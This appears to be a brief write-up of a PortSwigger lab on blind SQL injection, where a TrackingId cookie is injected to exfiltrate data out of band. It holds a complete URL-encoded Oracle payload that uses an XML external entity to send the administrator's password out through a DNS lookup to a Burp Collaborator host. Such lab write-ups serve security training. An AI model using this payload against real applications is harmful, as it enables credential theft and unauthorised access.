# Blind SQL injection with out-of-band data exfiltration — (PortSwigger — Practitioner)
**Date:** 2026-08-21
 
---
 
## Vulnerability / core concept
Blind SQL Injection

---


## Payload / key command
This web application uses `TrackingId` which queries the database. Using default injections will not work for this specific lab because we do not see any differences in the responses. Also we cannot test blind sql using error-based and time-based attacks. When we check the blind out-of-band interaction, we can see that we receive DNS look-up in our Burp Collaborator. This means we can extract data by using the following URL-encoded payload:
```bash
TrackingId='%20UNION%20SELECT%20EXTRACTVALUE(xmltype(%27%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%3C!DOCTYPE%20root%20%5B%20%3C!ENTITY%20%25%20remote%20SYSTEM%20%22http%3A%2F%2F%27%7C%7C(SELECT%20password%20FROM%20users%20WHERE%20username%3D%27administrator%27)%7C%7C%27.cyehe1tt6w1yaoz75ysp0o85cwin6ew2l.oastify.com%2F%22%3E%20%25remote%3B%5D%3E%27),%27%2Fl%27)%20FROM%20dual%20--
```
This payload uses query `select password from users where username='administrator'` and uses that value as subdomain and send dns look-up to our server. This way we can extract the password of the admin and log in to solve this lab.

